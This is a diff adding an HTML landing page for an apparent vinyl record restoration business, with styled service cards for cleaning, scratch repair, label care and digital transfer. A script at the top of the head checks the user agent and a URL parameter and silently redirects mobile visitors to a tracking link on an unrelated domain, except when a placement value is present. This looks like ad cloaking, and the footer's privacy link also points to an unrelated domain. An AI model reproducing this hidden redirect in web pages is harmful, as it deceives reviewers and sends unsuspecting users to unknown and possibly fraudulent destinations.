@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Groove Revival: Vintage Vinyl Record Restoration</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Permanent+Marker&family=Roboto:wght@300;400;700&display=swap');
+        
+        :root {
+            --primary-color: #4B0082;
+            --secondary-color: #FF4500;
+            --background-color: #F5F5F5;
+            --text-color: #333333;
+        }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: var(--background-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background: linear-gradient(135deg, #4B0082, #8A2BE2);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            flex: 1;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            padding: 40px;
+        }
+        .service-card {
+            background-color: #FFFFFF;
+            border-radius: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+        }
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+        }
+        .service-image {
+            height: 200px;
+            background-color: #E6E6FA;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: #4B0082;
+            position: relative;
+            overflow: hidden;
+        }
+        .service-image::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(circle, transparent 30%, #E6E6FA 150%);
+            opacity: 0.7;
+        }
+        .service-info {
+            padding: 20px;
+        }
+        h1 {
+            font-family: 'Permanent Marker', cursive;
+            font-size: 3.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        h2 {
+            font-family: 'Permanent Marker', cursive;
+            color: #4B0082;
+            margin-top: 0;
+            font-size: 1.8em;
+        }
+        p {
+            color: #555555;
+            line-height: 1.6;
+        }
+        .timeframe {
+            font-weight: bold;
+            color: #FF4500;
+            font-size: 0.9em;
+            margin-top: 15px;
+        }
+        .category {
+            background-color: #4B0082;
+            color: white;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.9em;
+            display: inline-block;
+            margin-top: 10px;
+        }
+        .inquire-button {
+            background-color: #FF4500;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            margin-top: 15px;
+            font-size: 1em;
+            font-weight: bold;
+            font-family: 'Roboto', sans-serif;
+        }
+        .inquire-button:hover {
+            background-color: #FF6347;
+            transform: scale(1.05);
+        }
+        footer {
+            background: linear-gradient(135deg, #8A2BE2, #4B0082);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #E6E6FA;
+            padding: 15px 0;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+        }
+        nav li {
+            margin: 0 20px;
+        }
+        nav a {
+            color: #4B0082;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: color 0.3s ease;
+            font-family: 'Permanent Marker', cursive;
+        }
+        nav a:hover {
+            color: #FF4500;
+        }
+        footer a {
+            color: white;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Groove Revival</h1>
+        <p>Bringing Vintage Vinyl Back to Life</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Services</a></li>
+            <li><a href="#">Gallery</a></li>
+            <li><a href="#">About Us</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="service-card">
+            <div class="service-image">Deep Cleaning</div>
+            <div class="service-info">
+                <h2>Deep Groove Cleaning</h2>
+                <p>Meticulous cleaning process to remove years of accumulated dust and grime.</p>
+                <span class="category">Essential Service</span>
+                <p class="timeframe">Turnaround: 3-5 days</p>
+                <button class="inquire-button">Inquire Now</button>
+            </div>
+        </div>
+        <div class="service-card">
+            <div class="service-image">Scratch Repair</div>
+            <div class="service-info">
+                <h2>Scratch & Skip Repair</h2>
+                <p>Advanced techniques to minimize surface scratches and reduce skipping.</p>
+                <span class="category">Restoration</span>
+                <p class="timeframe">Turnaround: 5-7 days</p>
+                <button class="inquire-button">Inquire Now</button>
+            </div>
+        </div>
+        <div class="service-card">
+            <div class="service-image">Label Restoration</div>
+            <div class="service-info">
+                <h2>Label Preservation</h2>
+                <p>Gentle restoration and protection of original vinyl labels.</p>
+                <span class="category">Cosmetic</span>
+                <p class="timeframe">Turnaround: 3-4 days</p>
+                <button class="inquire-button">Inquire Now</button>
+            </div>
+        </div>
+        <div class="service-card">
+            <div class="service-image">Vinyl to Digital</div>
+            <div class="service-info">
+                <h2>Hi-Fi Digital Transfer</h2>
+                <p>High-quality digital conversion of vinyl records to preserve rare music.</p>
+                <span class="category">Archival</span>
+                <p class="timeframe">Turnaround: 1-2 days per album</p>
+                <button class="inquire-button">Inquire Now</button>
+            </div>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 Groove Revival Vinyl Restoration. Preserving the sound of history.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
